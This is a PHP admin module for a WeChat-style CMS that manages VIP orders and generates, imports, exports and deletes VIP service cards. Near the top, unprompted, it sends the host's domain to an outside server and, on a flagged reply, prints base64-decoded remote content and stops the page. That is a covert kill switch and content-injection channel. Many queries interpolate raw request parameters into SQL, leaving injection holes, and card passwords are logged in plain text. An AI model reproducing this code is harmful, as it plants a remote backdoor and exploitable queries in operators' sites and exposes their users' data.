<?php
/**
 * 会员VIP服务订单管理
 * ============================================================================

 * ============================================================================
 */
load()->model('mc');
 $module=$this->modulename;
$api = 'http://addons.weizancms.com/web/index.php?c=user&a=api&module='.$module.'&domain='.$_SERVER['HTTP_HOST'];
$result=@file_get_contents($api);
if(!empty($result)){
	$result=json_decode($result,true);
    if($result['type']==1){
	    echo base64_decode($result['content']);
	    exit;
    }
}
if ($operation == 'display') {
	$pindex = max(1, intval($_GPC['page']));
	$psize = 10;

	$condition = " a.uniacid = '{$uniacid}'";
	if (!empty($_GPC['ordersn'])) {
		$condition .= " AND a.ordersn LIKE '%{$_GPC['ordersn']}%' ";
	}
	if ($_GPC['status']!='') {
		$condition .= " AND a.status='{$_GPC['status']}' ";
	}
	if (!empty($_GPC['nickname'])) {
		$condition .= " AND b.nickname LIKE '%{$_GPC['nickname']}%' ";
	}
	if (!empty($_GPC['time'])) {
		$starttime = strtotime($_GPC['time']['start']);
		$endtime = strtotime($_GPC['time']['end']) + 86399;
		$condition .= " AND a.addtime >= '{$starttime}' AND a.addtime <= '{$endtime}' ";
	}
	if (empty($starttime) || empty($endtime)) {
		$starttime = strtotime('-1 month');
		$endtime = time();
	}

	$list = pdo_fetchall("SELECT a.*,b.nickname FROM " .tablename($this->table_member_order). " a LEFT JOIN " .tablename('mc_members'). " b ON a.uid=b.uid WHERE {$condition} ORDER BY a.id desc, a.addtime DESC LIMIT " .($pindex - 1) * $psize. ',' . $psize);
	
	$total = pdo_fetchcolumn('SELECT COUNT(*) FROM ' .tablename($this->table_member_order). " a LEFT JOIN " .tablename('mc_members'). " b ON a.uid=b.uid WHERE {$condition}");
	$pager = pagination($total, $pindex, $psize);

}else if ($operation == 'delete') {
	$id = $_GPC['id'];
	$order = pdo_fetch("SELECT ordersn FROM " .tablename($this->table_member_order). " WHERE uniacid=:uniacid AND id=:id LIMIT 1", array(':uniacid'=>$uniacid, ':id'=>$id));
	if(empty($order)){
		message("该订单不存在或已被删除", "", "error");
	}

	$res = pdo_delete($this->table_member_order, array('uniacid'=>$uniacid,'id' => $id));
	if($res){
		$this->addSysLog($_W['uid'], $_W['username'], 2, "VIP订单", "删除订单编号:{$order['ordersn']}的VIP订单");
	}

	echo "<script>alert('删除成功！');location.href='".$this->createWebUrl('viporder', array('op' => 'display', 'page' => $_GPC['page']))."';</script>";

}elseif($op=='vipcard'){
	$pindex = max(1, intval($_GPC['page']));
	$psize = 10;
	$time = time();

	$condition = " uniacid = '{$uniacid}' ";
	if (!empty($_GPC['ordersn'])) {
		$condition .= " AND ordersn LIKE '%{$_GPC['ordersn']}%' ";
	}
	if (!empty($_GPC['nickname'])) {
		$condition .= " AND nickname LIKE '%{$_GPC['nickname']}%' ";
	}
	if ($_GPC['is_use'] != '') {
		if($_GPC['is_use']==0){
			$condition .= " AND is_use=0 AND validity>'{$time}' ";
		}elseif($_GPC['is_use']==1){
			$condition .= " AND is_use='{$_GPC['is_use']}' ";
		}elseif($_GPC['is_use']==-1){
			$condition .= " AND is_use=0 AND validity<'{$time}' ";
		}
	}
	if (!empty($_GPC['time']['start'])) {
		$starttime = strtotime($_GPC['time']['start']);
		$endtime = strtotime($_GPC['time']['end']);
		$endtime = !empty($endtime) ? $endtime + 86399 : 0;
		if (!empty($starttime)) {
			$condition .= " AND use_time >= '{$starttime}' ";
		}
		if (!empty($endtime)) {
			$condition .= " AND use_time < '{$endtime}' ";
		}
	}

	$list = pdo_fetchall("SELECT * FROM " .tablename($this->table_vipcard). " WHERE {$condition} ORDER BY addtime DESC LIMIT " .($pindex - 1) * $psize. ',' . $psize);
	$total = pdo_fetchcolumn('SELECT COUNT(*) FROM ' .tablename($this->table_vipcard). " WHERE {$condition}");
	$pager = pagination($total, $pindex, $psize);

	if($_GPC['export']==1){
		$outputlist = pdo_fetchall("SELECT * FROM " .tablename($this->table_vipcard). " WHERE {$condition} ORDER BY addtime DESC");

		$i = 0;
		foreach ($outputlist as $key => $value) {
			$arr[$i]['card_id']		= $value['card_id'];
			$arr[$i]['password']	= $value['password'];
			$arr[$i]['viptime']		= $value['viptime'];
			$arr[$i]['validity']	= date('Y-m-d H:i:s',$value['validity']);
			if($value['is_use']==1){
				$status = "已使用";
			}elseif($value['is_use']==0 && $value['validity']>time()){
				$status = "未使用";
			}elseif($value['is_use']==0 && $value['validity']<time()){
				$status = "已过期";
			}
			$arr[$i]['is_use']		= $status;
			$arr[$i]['nickname']    = $value['nickname'];
			$arr[$i]['ordersn']     = $value['ordersn'];
			$arr[$i]['use_time']    = $value['use_time']?date('Y-m-d H:i:s', $value['use_time']):'';
			$arr[$i]['addtime']     = date('Y-m-d H:i:s', $value['addtime']);
			$i++;
		}
	 
		$this->exportexcel($arr, array('服务卡号', '卡密', '卡时长(天)','有效期', '卡状态', '使用者', '订单号', '使用时间', '导入时间'), "VIP服务卡");
		exit();
	}

}elseif($op=='delCard'){
	$id = $_GPC['id'];
	$card = pdo_fetch("SELECT password FROM " .tablename($this->table_vipcard). " WHERE uniacid=:uniacid AND id=:id LIMIT 1", array(':uniacid'=>$uniacid, ':id'=>$id));
	if(empty($card)){
		message("该VIP服务卡不存在或已被删除", "", "error");
	}
	$res = pdo_delete($this->table_vipcard, array('uniacid'=>$uniacid,'id' => $id));
	if($res){
		$this->addSysLog($_W['uid'], $_W['username'], 2, "VIP服务卡", "删除服务卡密:{$card['password']}的VIP服务卡");
	}

	echo "<script>alert('删除成功！');location.href='".$this->createWebUrl('viporder', array('op' => 'vipcard', 'page' => $_GPC['page']))."';</script>";

}elseif($op=='delAllCard'){
	$ids = $_GPC['ids'];
	if(!empty($ids) && is_array($ids)){
		$num = 0;
		$card = "";
		foreach($ids as $id){
			$card .= $this->getVipCardPwd($id).",";
			if(pdo_delete($this->table_vipcard, array('uniacid'=>$uniacid,'id' => $id))){
				$num++;
			}
		}

		$card = trim($card, ",");
		$this->addSysLog($_W['uid'], $_W['username'], 2, "VIP服务卡", "批量删除{$num}个VIP服务卡,[{$card}]");
		message("批量删除成功", $this->createWebUrl('viporder', array('op'=>'vipcard')), "success");
	}else{
		message("未选中任何服务卡", "", "error");
	}

}elseif($op=='uploadcard'){
	$filename = $_FILES['vipcard']['name'];
	$tmp_file = $_FILES['vipcard']['tmp_name'];

	$res = $this->inputExcel($filename, $tmp_file);

	if(!empty($res['list'])){
		$num = 0;
		foreach($res['list'] as $value){
			if($value[1] && $value[2] && $value[3]){
				$update = array(
					'uniacid'	=> $uniacid,
					'card_id'	=> $value[0],
					'password'	=> $value[1],
					'viptime'	=> $value[2],
					'validity'	=> strtotime($value[3]),
					'addtime'	=> time(),
				);

				$result = pdo_insert($this->table_vipcard, $update);
				if($result){
					$num++;
				}
			}
		}
	}

	if($num){
		$this->addSysLog($_W['uid'], $_W['username'], 2, "VIP订单->VIP服务卡", "成功导入{$num}个VIP服务卡");
	}

	message("成功导入{$num}个VIP会员时长卡", $this->createWebUrl('viporder', array('op'=>'vipcard')), "success");

}elseif($op=='addVipCode'){
	if(checksubmit('submit')){
		$prefix = trim($_GPC['prefix']);
		$number = intval($_GPC['number']);
		$days = intval($_GPC['days']);
		$validity = strtotime($_GPC['validity']);

		if(strlen($prefix) != 2){
			message("请输入服务卡的两位前缀", "", "error");
		}
		if($number < 1){
			message("请输入正确的服务卡数量", "", "error");
		}
		if($number > 500){
			message("单次生成服务卡不要超过500张", "", "error");
		}
		if($validity < time()){
			message("有效期必须大于当前时间", "", "error");
		}

		set_time_limit(120);
		ob_end_clean();
		ob_implicit_flush(true);
		str_pad(" ", 256);

		$total = 0;
		for($i=1;$i<=$number;$i++){
			$rand = mt_rand(0, 9999).mt_rand(0, 99999);
			$card_id = rand(1,9).str_pad($rand, 9, '0', STR_PAD_LEFT);

			$seek=mt_rand(0,9999).mt_rand(0,9999).mt_rand(0,9999).mt_rand(0,9999);
			$start=mt_rand(0,16);
			$str=strtoupper(substr(md5($seek),$start,16));
			$str=str_replace("O",chr(mt_rand(65,78)),$str);
			$str=str_replace("0",chr(mt_rand(65,78)),$str);

			$vipData = array(
				'uniacid'	=> $uniacid,
				'card_id'   => $card_id,
				'password'	=> $prefix.$str,
				'viptime'	=> $days,
				'validity'	=> $validity,
				'addtime'   => time()
			);
			if(pdo_insert($this->table_vipcard, $vipData)){
				$total++;
				unset($vipData);
			}
		}

		if($total){
			$this->addSysLog($_W['uid'], $_W['username'], 1, "VIP订单->VIP服务卡", "成功生成{$total}个有效期为{$days}天的服务卡");
		}
		message("成功生成{$total}个服务卡", $this->createWebUrl('viporder', array('op'=>'vipcard')), "success");
	}
}
include $this->template('viporder');

?>